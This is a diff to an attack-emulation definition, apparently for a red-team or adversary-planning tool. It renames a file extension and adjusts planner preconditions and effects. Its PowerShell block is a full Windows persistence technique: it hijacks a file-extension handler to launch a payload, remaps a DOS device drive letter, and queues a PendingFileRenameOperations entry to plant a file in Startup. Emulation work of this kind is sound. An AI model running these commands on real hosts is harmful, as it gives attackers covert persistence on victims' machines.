@@ -25,15 +25,15 @@ description: |
 execution:
   executor: PowerShell
   command: |
-    reg add "HKEY_CLASSES_ROOT\.wofld" /ve /d "sys_update" /f
+    reg add "HKEY_CLASSES_ROOT\.wofldd" /ve /d "sys_update" /f
     New-Item -Path "Registry::HKEY_CLASSES_ROOT\sys_update\shell\open\command" -Force
     Set-ItemProperty -Path "Registry::HKEY_CLASSES_ROOT\sys_update\shell\open\command" -Name "(Default)" -Value '"#{MALWARE_PATH}" "%1"'
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "O:" /t REG_SZ /d "\??\C:\ProgramData\Microsoft\Windows\Start Menu\Programs" /f
     if (-not (Test-Path "C:\temp")) { New-Item -Path "C:\temp" -ItemType Directory -Force }
-    New-Item -Path "C:\temp\sys_update.wofld" -ItemType File -Force | Out-Null
+    New-Item -Path "C:\temp\sys_update.wofldd" -ItemType File -Force | Out-Null
     $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
-    $sourceFile = "\??\C:\temp\sys_update.wofld"
-    $destinationFile = "\??\O:\Startup\sys_update.wofld"
+    $sourceFile = "\??\C:\temp\sys_update.wofldd"
+    $destinationFile = "\??\O:\Startup\sys_update.wofldd"
     $value = @($sourceFile, $destinationFile)
     New-ItemProperty -Path $regPath -Name "PendingFileRenameOperations" -PropertyType MultiString -Value $value -Force
 arguments:
@@ -42,8 +42,8 @@ arguments:
     Required: true
     Description: The full path to the malicious payload to be executed.
 preconditions:
-  - (powershell_session ?eID - executor ?target - host)
-  - (is_administrator ?target - host)
+  - (powershell ?eID - executor ?target - host)
+  - (administrator_user ?user - user)
 effects:
   - (registry_modified ?target - host ?regPath - registry_key)
-  - (file_executed ?file - file ?target - host)
+  - (file_execution_at_startup ?file - file ?target - host)
